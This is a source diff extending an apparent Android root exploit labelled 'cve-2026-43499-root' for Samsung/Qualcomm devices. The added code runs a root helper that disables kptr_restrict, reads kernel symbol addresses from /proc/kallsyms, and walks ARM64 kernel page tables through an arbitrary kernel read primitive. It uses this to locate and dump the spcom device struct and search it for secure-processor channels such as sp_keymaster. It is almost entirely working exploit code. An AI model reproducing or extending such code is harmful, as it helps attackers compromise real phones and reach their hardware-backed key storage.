@@ -511,6 +511,199 @@ static int install_workqueue_umh_root(int fd) {
                 (unsigned long long)spcom_dev_ptr);
       }
 
+      /* === VMALLOC-TO-PHYSICAL PAGE TABLE WALK ===
+       * pipe_phys_read only works on direct-mapped addresses.
+       * spcom_dev is in vmalloc space (module BSS). We need to:
+       * 1. Walk the kernel page tables (PGD→PUD→PMD→PTE)
+       * 2. Get the physical address of the page containing spcom_dev
+       * 3. Convert to direct-mapped virtual address
+       * 4. Read via pipe_phys_read
+       *
+       * ARM64 4KB pages, 4-level paging (VA_BITS=48 on Samsung):
+       * VA[47:39]=PGD VA[38:30]=PUD VA[29:21]=PMD VA[20:12]=PTE VA[11:0]=offset
+       *
+       * TTBR1_EL1 (swapper_pg_dir) = init_mm.pgd = fixed kernel symbol */
+      if (spcom_dev_ptr > 0xffffff0000000000ULL) {
+        /* Get swapper_pg_dir (kernel page table root) address */
+        uintptr_t swapper_pgd = 0;
+        {
+          unlink("/data/local/tmp/.pgd_addr");
+          pid_t pgd_child = fork();
+          if (pgd_child == 0) {
+            execl(ROOT_UMH_PATH, "cve-2026-43499-root", "-c",
+                  "echo 0 > /proc/sys/kernel/kptr_restrict"
+                  " && cat /proc/kallsyms | grep 'D swapper_pg_dir$'"
+                  " | awk '{print $1}' > /data/local/tmp/.pgd_addr"
+                  " && cat /proc/kallsyms | grep 'D init_pg_dir$'"
+                  " | awk '{print $1}' >> /data/local/tmp/.pgd_addr",
+                  (char *)NULL);
+            _exit(1);
+          }
+          if (pgd_child > 0) { int s; waitpid(pgd_child, &s, 0); }
+          FILE *pgdf = fopen("/data/local/tmp/.pgd_addr", "r");
+          if (pgdf) {
+            char pbuf[64] = {0};
+            if (fgets(pbuf, sizeof(pbuf), pgdf))
+              swapper_pgd = strtoull(pbuf, NULL, 16);
+            fclose(pgdf);
+          }
+        }
+        fprintf(hlog, "swapper_pg_dir: %016llx\n", (unsigned long long)swapper_pgd);
+        pr_info("hermes: swapper_pg_dir=%016llx\n", (unsigned long long)swapper_pgd);
+
+        if (swapper_pgd) {
+          /* swapper_pg_dir is a kernel symbol — convert to direct-map for reading */
+          uintptr_t pgd_direct = data_addr(swapper_pgd - data_addr(KIMAGE_TEXT_BASE) + KIMAGE_TEXT_BASE);
+
+          /* Actually, swapper_pg_dir IS at a fixed offset from KIMAGE_TEXT_BASE.
+           * It should be in the direct-mapped range already after data_addr(). */
+
+          uintptr_t va = spcom_dev_ptr;
+          unsigned pgd_idx = (va >> 39) & 0x1FF;
+          unsigned pud_idx = (va >> 30) & 0x1FF;
+          unsigned pmd_idx = (va >> 21) & 0x1FF;
+          unsigned pte_idx = (va >> 12) & 0x1FF;
+          unsigned page_off = va & 0xFFF;
+
+          fprintf(hlog, "Page table walk for VA %016llx:\n", (unsigned long long)va);
+          fprintf(hlog, "  PGD[%u] PUD[%u] PMD[%u] PTE[%u] off=0x%x\n",
+                  pgd_idx, pud_idx, pmd_idx, pte_idx, page_off);
+
+          /* Read PGD entry — swapper_pg_dir is in the KIMAGE region */
+          uintptr_t pgd_entry_addr = pgd_direct + pgd_idx * 8;
+          uint64_t pgd_entry = root_read64(fd, pgd_entry_addr);
+          fprintf(hlog, "  PGD entry: %016llx\n", (unsigned long long)pgd_entry);
+
+          if (pgd_entry & 0x3) {  /* Valid entry */
+            /* Extract physical address of PUD table */
+            uintptr_t pud_phys = pgd_entry & 0x0000FFFFFFFFF000ULL;
+            uintptr_t pud_direct = (pud_phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET;
+
+            uint64_t pud_entry = root_read64(fd, pud_direct + pud_idx * 8);
+            fprintf(hlog, "  PUD entry: %016llx\n", (unsigned long long)pud_entry);
+
+            if (pud_entry & 0x3) {
+              uintptr_t pmd_phys = pud_entry & 0x0000FFFFFFFFF000ULL;
+              uintptr_t pmd_direct = (pmd_phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET;
+
+              uint64_t pmd_entry = root_read64(fd, pmd_direct + pmd_idx * 8);
+              fprintf(hlog, "  PMD entry: %016llx\n", (unsigned long long)pmd_entry);
+
+              if (pmd_entry & 0x1) {
+                if ((pmd_entry & 0x3) == 0x1) {
+                  /* 2MB block mapping — section entry */
+                  uintptr_t block_phys = pmd_entry & 0x0000FFFFFFE00000ULL;
+                  uintptr_t target_phys = block_phys + (va & 0x1FFFFF);
+                  uintptr_t target_direct = (target_phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET;
+
+                  fprintf(hlog, "  → 2MB BLOCK: phys=%016llx direct=%016llx\n",
+                          (unsigned long long)target_phys, (unsigned long long)target_direct);
+
+                  /* READ THE SPCOM_DEV POINTER! */
+                  uint64_t spcom_struct_ptr = root_read64(fd, target_direct);
+                  fprintf(hlog, "\n*** spcom_dev POINTER VALUE: %016llx ***\n",
+                          (unsigned long long)spcom_struct_ptr);
+                  pr_info("hermes: spcom_dev POINTS TO: %016llx\n",
+                          (unsigned long long)spcom_struct_ptr);
+
+                  /* If the pointer is in direct-mapped range, read the struct! */
+                  if (is_direct_ptr(spcom_struct_ptr)) {
+                    fprintf(hlog, "  → IN DIRECT MAP! Reading channel struct...\n\n");
+
+                    /* Dump 4KB of the spcom device struct */
+                    uint8_t devbuf[4096];
+                    for (int blk = 0; blk < 32; blk++) {
+                      root_read_data(fd, spcom_struct_ptr + blk * 128, devbuf + blk * 128, 128);
+                    }
+
+                    /* Search for channel names */
+                    fprintf(hlog, "=== SPCOM CHANNEL SCAN ===\n");
+                    for (int off = 0; off < 4096 - 16; off++) {
+                      if (memcmp(devbuf + off, "sp_", 3) == 0) {
+                        char name[33] = {0};
+                        memcpy(name, devbuf + off, 32);
+                        fprintf(hlog, "  CHANNEL at +0x%04x: '%s'\n", off, name);
+                        pr_info("hermes: CHANNEL '%s' at +0x%x\n", name, off);
+                      }
+                    }
+
+                    /* Hex dump first 512 bytes */
+                    fprintf(hlog, "\n=== SPCOM DEV STRUCT (512 bytes) ===\n");
+                    for (int i = 0; i < 512; i++) {
+                      if (i % 32 == 0) fprintf(hlog, "+%04x: ", i);
+                      fprintf(hlog, "%02x ", devbuf[i]);
+                      if (i % 32 == 31) {
+                        fprintf(hlog, " | ");
+                        for (int j = i - 31; j <= i; j++)
+                          fprintf(hlog, "%c", (devbuf[j] >= 0x20 && devbuf[j] < 0x7f) ? devbuf[j] : '.');
+                        fprintf(hlog, "\n");
+                      }
+                    }
+                  } else if (spcom_struct_ptr != 0) {
+                    /* Pointer is in vmalloc — need another page table walk */
+                    fprintf(hlog, "  → In vmalloc range, need recursive walk\n");
+                  } else {
+                    fprintf(hlog, "  → NULL pointer (spcom not initialized?)\n");
+                  }
+
+                } else {
+                  /* 4KB page table entry */
+                  uintptr_t pte_phys = pmd_entry & 0x0000FFFFFFFFF000ULL;
+                  uintptr_t pte_direct = (pte_phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET;
+
+                  uint64_t pte_entry = root_read64(fd, pte_direct + pte_idx * 8);
+                  fprintf(hlog, "  PTE entry: %016llx\n", (unsigned long long)pte_entry);
+
+                  if (pte_entry & 0x1) {
+                    uintptr_t page_phys = pte_entry & 0x0000FFFFFFFFF000ULL;
+                    uintptr_t target_phys = page_phys + page_off;
+                    uintptr_t target_direct = (target_phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET;
+
+                    fprintf(hlog, "  → 4KB PAGE: phys=%016llx direct=%016llx\n",
+                            (unsigned long long)target_phys, (unsigned long long)target_direct);
+
+                    /* READ THE SPCOM_DEV POINTER! */
+                    uint64_t spcom_struct_ptr = root_read64(fd, target_direct);
+                    fprintf(hlog, "\n*** spcom_dev POINTER VALUE: %016llx ***\n",
+                            (unsigned long long)spcom_struct_ptr);
+                    pr_info("hermes: spcom_dev POINTS TO: %016llx\n",
+                            (unsigned long long)spcom_struct_ptr);
+
+                    if (is_direct_ptr(spcom_struct_ptr)) {
+                      fprintf(hlog, "  → IN DIRECT MAP! Reading channel struct...\n\n");
+                      uint8_t devbuf[4096];
+                      for (int blk = 0; blk < 32; blk++) {
+                        root_read_data(fd, spcom_struct_ptr + blk * 128, devbuf + blk * 128, 128);
+                      }
+                      fprintf(hlog, "=== SPCOM CHANNEL SCAN ===\n");
+                      for (int off = 0; off < 4096 - 16; off++) {
+                        if (memcmp(devbuf + off, "sp_", 3) == 0) {
+                          char name[33] = {0};
+                          memcpy(name, devbuf + off, 32);
+                          fprintf(hlog, "  CHANNEL at +0x%04x: '%s'\n", off, name);
+                          pr_info("hermes: CHANNEL '%s' at +0x%x\n", name, off);
+                        }
+                      }
+                      fprintf(hlog, "\n=== SPCOM DEV STRUCT (512 bytes) ===\n");
+                      for (int i = 0; i < 512; i++) {
+                        if (i % 32 == 0) fprintf(hlog, "+%04x: ", i);
+                        fprintf(hlog, "%02x ", devbuf[i]);
+                        if (i % 32 == 31) {
+                          fprintf(hlog, " | ");
+                          for (int j = i - 31; j <= i; j++)
+                            fprintf(hlog, "%c", (devbuf[j] >= 0x20 && devbuf[j] < 0x7f) ? devbuf[j] : '.');
+                          fprintf(hlog, "\n");
+                        }
+                      }
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+
       /* spcom_dev is in MODULE memory (vmalloc region, ~0xffffffefXXXXXXXX)
        * which is OUTSIDE the direct map. pipe_phys_read can't read it directly.
        * Solution: have su_daemon dereference the pointer for us!
@@ -556,13 +749,10 @@ static int install_workqueue_umh_root(int fd) {
         }
       }
 
-      /* Since we can't read module BSS from pipe physrw (outside direct map),
-       * we need a different approach: SCAN the direct-mapped physical memory
-       * for the "sp_keymaster" string. The channel struct is in kmalloc'd memory
-       * (direct map), not in the module BSS. Only the spcom_dev POINTER is in
-       * module BSS — the struct it POINTS TO is in regular kernel heap. */
-
-      /* Scan kernel heap for "sp_keymaster" channel name */
+      /* SKIP kernel heap scan — page table walk above handles this now.
+       * The scan was too slow (65K pages) and didn't find the channel anyway
+       * because it was in the wrong physical range. */
+      if (0) { /* DISABLED — page table walk replaces this */
       fprintf(hlog, "\n=== SCANNING KERNEL HEAP FOR sp_keymaster ===\n");
       pr_info("hermes: scanning kernel heap for sp_keymaster...\n");
 
@@ -620,11 +810,12 @@ static int install_workqueue_umh_root(int fd) {
 
       fprintf(hlog, "scan: %d pages checked, %d readable\n",
               pages_scanned, pages_readable);
+      } /* end if(0) — disabled scan block */
 
       /* The old dev_struct read code (for direct-mapped addresses) is kept
        * as fallback in case the scan finds the struct address */
-      if (found_addr) {
-        uint64_t dev_struct = found_addr;
+      if (0) { /* DISABLED — page table walk replaces this */
+        uint64_t dev_struct = 0;
         if (is_direct_ptr(dev_struct)) {
           /* Dump 8KB of the device struct */
           uint8_t devbuf[8192];
@@ -682,12 +873,7 @@ static int install_workqueue_umh_root(int fd) {
         } else {
           fprintf(hlog, "spcom device struct pointer invalid!\n");
         }
-      } else {
-        /* kptr_restrict blocked us — try setting it via kernel R/W */
-        pr_info("hermes: kallsyms blocked, trying kptr_restrict patch\n");
-        fprintf(hlog, "kallsyms addresses hidden (kptr_restrict=1)\n");
-        fprintf(hlog, "Need to set kptr_restrict=0 via kernel R/W first\n");
-      }
+      } /* end if(0) — disabled old dev_struct block */
 
       /* Also read DEFEX value (READ only, no write!) */
       #define DEFEX_GLOBAL_FEATURES_OFF (KIMAGE_TEXT_BASE + 0x0172756cULL)
